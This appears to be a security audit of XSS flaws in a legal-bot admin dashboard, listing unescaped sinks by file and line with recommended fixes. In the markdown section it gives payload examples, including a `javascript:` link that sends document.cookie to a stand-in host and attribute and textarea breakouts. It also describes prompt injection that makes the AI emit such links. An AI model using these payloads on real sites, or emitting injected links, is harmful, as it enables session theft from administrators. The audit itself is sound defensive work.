# Frontend chiqishini ekranlash (XSS) auditi

I found about 45 places where outside text reaches the DOM unescaped or only partly escaped. The worst ones let a Telegram user or the AI run script in an admin's session. Everything below comes from reading the code; I changed nothing.

The site has no Content-Security-Policy (`helmet({ contentSecurityPolicy: false })`, `src/api/server.js:268`), so nothing limits injected script. The session cookie is httpOnly, but injected script can still call the API as the logged-in admin.

## Escaping helpers

| Helper | Location | Escapes | Quotes? | Notes |
|---|---|---|---|---|
| `escapeHtml(text)` | `/home/user/dictum-legal-bot/public/dashboard.html:10830` | `& < >` | **No** | The main helper in `dashboard.html`, used about 150 times. It is **not safe inside attributes**. It returns `''` for any falsy value and throws on numbers or objects (`text.replace`). |
| `esc` (local, team chat) | `dashboard.html:17241` | `& < > "` | `"` only | Only used inside `renderChatMessages`. |
| `esc` (flagged-answers panel) | `dashboard.html:17719` | `& < > "` | `"` only | |
| `attrArg(s)` | `dashboard.html:15130` | JSON-encodes, then `& "` | yes | Safe for `onclick="fn(ARG)"`. It is used in only one place; the other inline handlers build strings by hand. |
| `truncate` | `dashboard.html:11377` | none | — | Only shortens text, but is used at a sink as if it were safe (14352). |
| `esc(value)` | `/home/user/dictum-legal-bot/public/js/workspace.js:275` | `& < > " '` | yes | Complete. `workspace.js` uses it consistently. |
| `escapeHtml(value)` | `/home/user/dictum-legal-bot/public/attorneys.html:138` | `& < > " '` | yes | Complete. |
| `esc(s)` | `/home/user/dictum-legal-bot/public/enterprise.html:156` | `& < >` | **No** | |
| `esc(s)` | `/home/user/dictum-legal-bot/public/templates.html:306` | `& < >` | **No** | Used inside `value="..."` attributes. |

## How AI markdown is rendered

- **`dashboard.html:10761` `simpleMarkdown` and `10811` `formatBlock`.** This renders every AI chat answer, saved history, archived analysis and the modal chat. It escapes only `& < >`, then adds tags. The link rule at **10818** is `\[(.+?)\]\((.+?)\)` → `<a href="$2">`:
  - There is no scheme check, so `javascript:` URLs pass. Payloads without parentheses work, e.g. `javascript:location='//x/?'+document.cookie`.
  - `"` is not escaped, so `[x](a" onfocus="…)` breaks out of the `href` attribute.
  - This can be triggered by prompt injection: a user question, an attached document, or corpus text that makes the AI output the link.
- **`enterprise.html:159` `md()`.** Same problem: `esc` without quotes, and links become `<a href="$2">` with no scheme check.
- **`workspace.js:633` `safeMarkdown`.** Safe. It escapes everything including quotes and only allows `https?://` links. (Minor: the URL gets escaped twice, so `&` shows as `&amp;amp;`.)
- **AI-generated documents are not markdown at all.** Raw LLM HTML from `/api/draft/ai-generate` and the opinion endpoint is inserted as-is (see the table). The server only trims empty `<p>` tags (`src/drafting/routes.js:457-465`) and does no sanitising.

## Findings

| file:line | Sink | Untrusted value | Escaped? | Fix |
|---|---|---|---|---|
| dashboard.html:10447 (sink 10622 `modalContent.innerHTML`) | innerHTML | `request.request_text` (any Telegram or web user) | **no** | `escapeHtml(cleanRequestText(...))` |
| dashboard.html:10299, 10304 | same modal | `first_name`/`name`, `username` | no | escapeHtml |
| dashboard.html:10454 | same modal | `request.file_name` (user's upload name) | no | escapeHtml |
| dashboard.html:10339, 10352, 10355 | same modal | `category`; `triage_result.urgency` inside a `class` attribute; `triage_result.complexity` (AI output) | no | escapeHtml; whitelist urgency |
| dashboard.html:10369, 10474, 10495, 10507 | same modal | `assigned_lawyer_name`, `responded_by` | no | escapeHtml |
| dashboard.html:10472, 10493 | same modal | `request.response_text`, which can be AI text sent via "use AI as answer" | no | Render with `simpleMarkdown` (once fixed) or escape |
| dashboard.html:10505, 10552 | same modal | `student_response` | no | escapeHtml |
| dashboard.html:10525 | `<textarea>` content | `student_response`; only `"` is replaced, so `</textarea><img onerror>` breaks out | partial | escapeHtml |
| dashboard.html:10434 | same modal | `block_reason` | no | escapeHtml |
| dashboard.html:10393, 10403 | `<option>` text | `admin.full_name` | no | escapeHtml |
| dashboard.html:10419, 10423, 10427 | `onclick="...('${request.username}')"` | username inside a JS string inside an attribute | no | `attrArg(request.username)` |
| dashboard.html:10100, 10112, 10124, 10135, 10138 | onclick | `file_id` (server/Telegram, low risk) | no | `attrArg` |
| dashboard.html:10818 (callers 10860, 10991, 11054, 11654, 13427, 14059, 14612) | innerHTML via `simpleMarkdown` | AI answers and archived analyses | partial (no quote escaping, no link scheme check) | Escape quotes; allow only `https?:` links; escape `$2` with a quote-safe escaper |
| dashboard.html:12644 (from 12328, 12507, 14024) | `messagesEl.innerHTML +=` `body` | raw LLM HTML (`d.html`, `msg.text` for opinions) | **no** | Sanitise with DOMPurify, allowing only p/h2/h3/table/strong/br |
| dashboard.html:12575 (`bracketsToFields`) | `data-label`/`data-hint` | text inside `[...]` in AI HTML | partial (no quotes) | Use a quote-safe escaper |
| dashboard.html:12637-12640 | `data-title` / `data-topic` / `data-doc-hash` | `docType` typed by the user, topic from the server | partial (no quotes) | Use a quote-safe escaper |
| dashboard.html:12808 | `w.document.write(d.html)` into a same-origin `about:blank` window | server page built from AI HTML, with the title unescaped in `<title>` (`routes.js:79`) | no | Sanitise the body and escape the title on the server, or use a `srcdoc` iframe with `sandbox` |
| dashboard.html:8702, 8703 | `tbody.innerHTML` (admin table) | `admin.full_name`, `telegram_username`/`username` | no | escapeHtml |
| dashboard.html:8783 | rankings | `item.full_name` | no | escapeHtml |
| dashboard.html:15788 | `onclick="confirmDeleteAdmin(..,'${full_name}')"` | full_name; only `'` is escaped | partial | `attrArg` |
| dashboard.html:17137 | members list | `admin.full_name` | no | escapeHtml |
| dashboard.html:17297 (`renderMsgText`) | chat `@mention` | `admin.full_name`, `admin.username` (the latter in `title`) | no | escapeHtml / quote-safe |
| dashboard.html:17388 (sink 17386) | chat notification | `msg.full_name` | no | escapeHtml |
| dashboard.html:17443 (sink 17439) | header notification | `msg.full_name`, `msg.role` (also in `class`) | no | escapeHtml |
| dashboard.html:17627 (sink 17632) | mention dropdown | `admin.full_name`, `admin.username` | no | escapeHtml |
| dashboard.html:13659, 13660 | usage report | `u.full_name` (text) and `u.username` (in `title=`), end users | no | escapeHtml / quote-safe |
| dashboard.html:13726 | feedback list | `fb.user_name` | no | escapeHtml |
| dashboard.html:14952, 14953 | `title="${escapeHtml(...)}"` | `message_preview` (Telegram user text), Hermes `reason`/`response_preview` | partial (no quotes, so attribute breakout) | Use a quote-safe escaper |
| dashboard.html:14712, 14718, 14722 | `value="${escapeHtml(...)}"` | attorney `license_number`, `region`, `verification_source` (from applicants) | partial | Use a quote-safe escaper |
| dashboard.html:14978 | `onclick="setTelegramConversationMode('${escapeHtml(chat_id)}')"` | chat_id (numeric; low risk) | partial | `attrArg` |
| dashboard.html:8547 | `value="escapeHtml(opt)"` | survey options (admin-entered) | partial | Use a quote-safe escaper |
| dashboard.html:15028 | `value=` | survey question text (admin) | partial | Use a quote-safe escaper |
| dashboard.html:11524 | `href` / `title` | ingest `source_url` (can be `javascript:`), `error_msg` | partial | Use a quote-safe escaper; allow only `https?:` |
| dashboard.html:15166 | `href="' + s.lex_url + '"` | suggested source URL (origin not verified) | no | Escape; allow only `https://lex.uz` |
| dashboard.html:13368 | RAG badge (master only) | `s.laws`, `s.type`, `data.rag.searchMode` | no | escapeHtml |
| dashboard.html:14352 | queue-status log | `e.lawName`/`category`/`docId`, `e.error` via `truncate` | no | escapeHtml(truncate(...)) |
| dashboard.html:16407, 16427, 16430 | block-history modal | `username`, `performed_by_name`, `reason` | no | escapeHtml |
| dashboard.html:15950, 15952, 15954 and 15879 | registration approval | `c.username`, `c.telegram` (applicant); `copyText` inside an onclick string | no | escapeHtml + `attrArg` |
| dashboard.html:15760, 15853 | onclick `viewRegDoc('${document_file_id}')` | file id (server) | no | `attrArg` |
| dashboard.html:9929 | `title="AI: ${urgency}"` and `${req.request_type}` | AI triage output; request type | no | escapeHtml / whitelist |
| dashboard.html:11028, 11031, 11057, 11156, 13644, 13674, 13734, 14622, 15697 | error text in innerHTML | `data.error` / `e.message` from the API | no | Use `textContent`, or escapeHtml |
| dashboard.html:8506 | `href` | `data.deepLink` (server) | no | Allow only `https://t.me/` |
| enterprise.html:163 (`md`, used at 234) | innerHTML | AI reply links | partial (no quotes, no scheme check) | Escape quotes; allow only `https?:` |
| enterprise.html:231 | `href="${esc(s.url)}"` | source URLs | partial | Quote-safe escaper + `https?:` only |
| templates.html:367, 368, 391, 463-465 | `value="${esc(...)}"` | template name, slug, field key/labels | partial (no quotes) | Add `"` and `'` to `esc` |
| templates.html:486 | `onclick="insertKey('${k}')"` and chip text | field key | no | Validate `^\w+$` or use `attrArg` |
| templates.html:524, 559 | preview innerHTML | label unescaped at 524; template body is raw HTML by design | no / by design | escape the label; body edits are master-only (`routes.js:254`) |
| login.html:940, 1018 | `otpStatus.innerHTML` | `err.message` from the API | no | Use `textContent` |

These are safe (checked): all of `js/workspace.js` (every value goes through `esc`, and the member IDs used raw are numeric); `js/ai-dashboard.js` and `js/dashboard-chat.js` (they build nodes with `textContent`, and the `html:` option of `el()` is never used); `attorneys.html`; `workspace-invite.html` (the workspace name uses `textContent`); `index.html` and `tariff.html` (no sinks). URL parameters (`?tab`, `#hash`, `?field`, `?token`, `?invite`) never reach an HTML sink. `?tab` only goes into a `querySelector` (17692).

**Not verified:**
- Whether `response_text` is meant to hold HTML.
- The character set allowed for web-user `username`/`full_name`.
- Where `lex_url` comes from.
- Whether `c.telegram` is limited to Telegram's allowed username characters.

Checked and fine: `error_type`/`source` in the answer-feedback panel are whitelisted on the server (`server.js:1047,1055`).

## The 10 most important fixes

1. **Request detail modal (`dashboard.html:10290-10610`).** Escape `request_text`, `first_name`, `username`, `file_name`, `category`, `response_text`, `student_response` (including the 10525 textarea), `block_reason`, `responded_by`, `assigned_lawyer_name` and the triage fields. Pass `username` to onclick through `attrArg`. Right now any Telegram user can get stored XSS in the admin who opens their request.
2. **Make dashboard `escapeHtml` escape `"` and `'` (10830) and accept non-strings (`String(text)`).** This one change fixes every attribute breakout: 14952 (Telegram message preview), 14712/14718/14722 (attorney applicant fields), 12575, 12637-12640, 8547, 11524, 15028.
3. **Fix the `simpleMarkdown`/`formatBlock` links (10818).** Escape the text quote-safely, allow only `https?:` (or `https://lex.uz` only), and escape `$2`. This covers every AI answer and all saved history.
4. **Sanitise AI-generated document HTML before `renderDocMessage` (12644) and before `document.write` (12808).** Use DOMPurify with a small tag allowlist, and escape the title in `wrapDocumentHtml` on the server.
5. **Team member names (`full_name`/`username`) everywhere.** Covers 8702, 8703, 8783, 10393, 10403, 15788 (`attrArg`), 17137, 17297, 17388, 17443, 17627. Names come from public lawyer/student registrations.
6. **Usage report and feedback lists (13659, 13660, 13726).** End-user names shown to the master admin.
7. **Registration approve/reject cards (15879, 15950-15954) and block history (16407, 16427, 16430).** Escape the values and move clipboard/onclick strings to `attrArg` or `addEventListener`.
8. **`enterprise.html` `md()` and `esc()`.** Add quote escaping and an `https?:` check for links (163, 231).
9. **API error messages into innerHTML.** Switch to `textContent` at 11028, 11031, 11057, 11156, 13644, 13674, 13734, 14622, 15697 and login 940/1018.
10. **URL `href`s and the admin-panel leftovers.** Allow only `https?:` for `lex_url` (15166), `source_url` (11524) and `deepLink` (8506); escape the RAG badge (13368), queue log (14352) and triage `title`/class (9929, 10352). Also add quote escaping to `templates.html` `esc` and validate field keys (486).

**Outside this review's scope, worth a separate look:**
- **Content-Security-Policy.** Turning one on would be a good backstop behind all of the above.
- **`postAuthDestination` in `login.html:888`.** It accepts `/\evil.com` as a redirect target, because it only blocks `//`. Browsers treat that path as another site, so it is an open redirect.